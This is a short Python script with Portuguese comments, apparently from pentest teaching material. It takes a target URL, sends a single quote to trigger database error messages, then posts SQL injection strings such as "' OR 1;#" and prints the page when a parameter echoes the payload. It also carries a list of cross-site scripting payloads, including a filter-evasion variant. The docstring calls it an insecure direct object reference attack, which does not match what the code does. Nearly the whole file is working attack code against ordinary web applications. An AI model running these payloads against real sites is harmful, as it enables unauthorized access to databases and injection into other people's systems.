#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo faz
  tentaiva de ataque ao
  Referência de objeto direto

  Modificado em 28 de fevereiro de 2017
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importando as bibliotecas necessárias.
import requests
import sys

# Argumento necessário
url = sys.argv[1]
initial = "'"

# Tipos de payload para testes
secondary = ["' OR 1;#", " OR 1;#"]
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']


first = requests.post(url+initial)
if "mysql" in first.text.lower() or "native client" in first.text.lower() or "syntax error" in first.text.lower():
	print("Injetável")
	for payload in secondary: # Pode trocar por payloads ou secondary
		req = requests.post(url+payload)
		if payload in req.text:
			print("Parâmetro vulnerável\r\n")
			print("Atacando com a string: "+payload)
			print(req.text)
			break
		else:
			print("Não é vulnerável")
else:
	print("Não Injetável")


